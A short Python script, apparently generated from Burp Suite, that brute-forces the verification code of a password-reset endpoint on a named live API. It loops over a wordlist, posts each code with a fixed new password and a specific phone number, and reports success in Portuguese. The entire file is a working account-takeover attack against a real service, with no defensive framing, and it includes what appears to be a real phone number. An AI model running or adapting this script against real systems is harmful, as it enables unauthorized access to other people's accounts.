import requests
import itertools

burp0_url = "https://api.myidols.io:443/api"
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://app.myidols.io", "Referer": "https://app.myidols.io/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
password = 554371


file = open("wordlist.txt", "r")

for password in file.readlines():
    password = password.strip("\n")
    burp0_json={"data": {"/change-password": {"code":password,"email":"","newPassword":"Duarte300@@","telephone":"+5511971596516"}}}
    resultado = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)
    print(password)
    if b'{"data":{"\\/change-password":{"status":0,"message":"Verification code incorrect."}}}' == resultado.content:
        print("Pin incorreto")

    elif b'{"data":{"\\/change-password":{"status":0,"message":"Code expired"}}}' == resultado.content:
        print("Códgio expirado.")
        break

    else:
        print("Senha alterada com sucesso.")
        break